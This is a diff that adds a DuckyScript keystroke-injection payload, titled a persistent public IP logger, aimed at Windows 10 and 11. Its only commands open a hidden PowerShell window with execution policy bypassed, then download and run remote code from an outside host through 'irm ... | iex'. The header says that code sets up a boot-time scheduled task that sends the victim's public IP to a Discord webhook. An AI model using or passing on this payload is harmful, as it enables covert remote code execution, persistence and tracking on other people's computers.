@@ -1,0 +1,12 @@
+REM     Title: Persistent public IP logger
+
+REM     Author: kuhi
+
+REM     Description: This payload is meant to write a python script and schedule a task to send the public ip to a discord webhook on every boot.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/9nb | iex
+ENTER
